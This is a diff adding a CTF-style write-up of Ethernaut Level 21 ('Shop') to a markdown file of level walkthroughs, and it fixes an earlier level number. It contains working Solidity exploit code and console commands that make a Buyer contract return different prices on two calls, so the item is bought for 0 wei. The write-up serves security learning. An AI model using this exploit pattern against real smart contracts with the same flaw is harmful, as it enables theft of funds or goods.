@@ -1213,7 +1213,7 @@ Verified ownership and submitted the instance.
 ![Level Complete Output](assets/aliencodex.png)
 
 
-# Ethernaut Level 21: Denial
+# Ethernaut Level 20: Denial
 
 ## Strategy
 
@@ -1282,3 +1282,96 @@ The level checks if the owner is blocked from withdrawing under a 1M gas cap.
 Submitted the instance, and the level was marked complete.
 
 ![Level Complete Output](assets/denial.png)
+
+
+# Ethernaut Level 21: Shop
+
+## Strategy
+
+- **Vulnerability**: The `Shop` contract calls the `price()` function of the `Buyer` contract **twice**, once for validation and once for assignment, assuming consistent return values from a `view` function.
+- **Exploit**:
+  - I deployed a custom `Buyer` contract that implements the `price()` function to return different values depending on the `Shop` contract’s `isSold` state.
+  - On the first call (inside the `if` condition), `price()` returned the full asking price (≥ 100).
+  - On the second call (after `isSold` is set to true), `price()` returned `0`, effectively buying the item for free.
+
+---
+
+## Understanding the Flow
+
+```
+if (_buyer.price() >= price && !isSold) {
+    isSold = true;
+    price = _buyer.price();
+}
+```
+
+- The `price()` function is called **twice**:
+  1. For checking the condition.
+  2. For assigning the new value to `Shop.price`.
+- Since `price()` is `view`, we cannot track call counts using storage, but we **can check `Shop.isSold()`** to infer which call we're in.
+
+---
+
+## Exploit Steps
+
+### 1. Deployed a Custom `Buyer` Contract
+
+```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+interface IShop {
+    function buy() external;
+    function isSold() external view returns (bool);
+    function price() external view returns (uint);
+}
+
+contract Buyer {
+    function price() external view returns (uint) {
+        bool isSold = IShop(msg.sender).isSold();
+        uint askedPrice = IShop(msg.sender).price();
+
+        if (!isSold) {
+            return askedPrice; // return 100 during the first call
+        }
+
+        return 0; // return 0 during the second call
+    }
+
+    function buyFromShop(address _shopAddr) public {
+        IShop(_shopAddr).buy();
+    }
+}
+```
+
+---
+
+### 2. Initiated the Purchase
+
+```
+await buyerContract.buyFromShop("<shop-instance-address>");
+```
+
+- This triggered the two calls to `price()`.
+- My contract returned 100 for the first check, and 0 for the assignment after `isSold` was true.
+
+---
+
+### 3. Verified the Exploit
+
+```
+await contract.price().then(v => v.toString()); // Output: '0'
+await contract.isSold(); // Output: true
+```
+
+- Item was marked as sold.
+- Final price was set to `0`.
+
+---
+
+### Level Completed
+
+- Successfully bought the item for **0 wei**, bypassing the original 100 wei price.
+- Submitted the instance and completed the level.
+
+![Level Complete Output](assets/shop.png)
